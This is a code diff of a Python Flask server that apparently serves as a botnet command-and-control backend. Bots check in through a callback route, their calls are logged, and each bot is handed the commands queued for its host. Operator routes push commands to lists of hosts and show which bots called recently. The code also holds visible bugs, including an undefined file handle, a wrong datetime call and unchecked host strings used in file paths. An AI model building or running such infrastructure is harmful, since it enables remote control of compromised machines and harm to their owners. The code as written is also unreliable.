@@ -5,61 +5,79 @@ track of bot callbacks
 """
 
 from flask import Flask, request
+from time import gmtime, strftime
 import os
 import datetime
+
+
 
 app = Flask(__name__)
 
 
-@app.route('/api/callback')
-def process_callbacks():
-    content = request.json
-    hostname = content['hostname']
-    hostname = hostname.lower()
-    calltime = content['time']
-    if os.path.isfile("/tmp/cc/callbacks.txt"):
-        with open("/tmp/cc/callbacks.txt", "w+") as f:
-            data = f.read()
-            if hostname in data:
-                new_d = ""
-                for line in data:
-                    if hostname in line:
-                        new_l = hostname + ":    " + calltime + "\n"
-                        new_d += new_l
-                    else:
-                        new_d += line
-                f.write(new_d)
-            else:
-                data += hostname + ":   " + calltime + "\n"
-                f.write(data)
-    else:
-        with open("/tmp/cc/callbacks.txt", "w+") as f:
-            s = hostname + ":   " + calltime + "\n"
-            f.write(s)
+@app.route('/api/callback/<host>/<typ>')
+def process_callbacks(host, typ):
     
+    ip = host.replace("-", ".")
+    src = typ
+    call_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
+
     if os.path.isfile("/tmp/cc/calls.log"):
-        with open("/tmp/cc/calls.log", "a") as f:
-            f.write(hostname + ":   " + calltime + "\n"
+        with open("/tmp/cc/calls.log", 'a') as f:
+            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
+            f.write(s)
     else:
-        with open("/tmp/cc/calls.log", "w+") as f:
-            f.write(hostname + ":   " + calltime + "\n"
-    
-    return
+        with open("/tmp/cc/calls.log", 'w'):
+            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
+            f.write(s)
 
-@app.route('/api/commands/<host>')
-def give_commands(host):
-    coms = ""
-    try:
-        dir_str = "/tmp/cc/hosts/" + host + ".txt"
-        with open(dir_str, "r") as f:
-            coms = f.read()
-    except:
-        coms = ""
-    return coms
+    com_file = "/tmp/cc/hosts/" + ip
+    if os.path.isfile(com_file):
+        with open(com_file, 'r') as f:
+            c = f.read()
+            os.remove(com_file)
+            return c
+    else:
+        return "#lmao" 
 
-@app.route('/api/commander')
+
+@app.route('/api/commander/push')
 def proc_inc_coms():
-    
+    content = request.json 
+    host_str = content['hosts']
+    coms = content['commands']
+    hosts = host_str.split('|')
+    for h in hosts:
+        com_file = "/tmp/cc/hosts/" + h
+        if os.path.isfile(com_file):
+            with open(com_file, 'a') as f:
+                f.write(coms)
+        else:
+            with open(com_file, 'w') as f:
+                f.write(coms)
     return
+
+
+def parse(filename):
+    data = {}
+    for line in reversed(list(open(filename))):
+        date, time, ip, source = line.strip().split()
+        log_time = datetime.strptime(date +" "+time, '%Y-%m-%d %H:%M:%S')
+        diff = (datetime.now() - log_time)/60
+        if diff > 10:
+            break
+        if ip not in data:
+            data[ip] = set()
+        data[ip].add(source)
+    return data
+
+
+@app.route('/api/commander/show')
+def show_hosts():
+    host_str = ""
+    data = parse("/tmp/cc/calls.log")
+    for ip in data:
+        ln = "{}: {}".format(ip, data[ip]) + "\n"
+        host_str += ln
+    return host_str
 
 
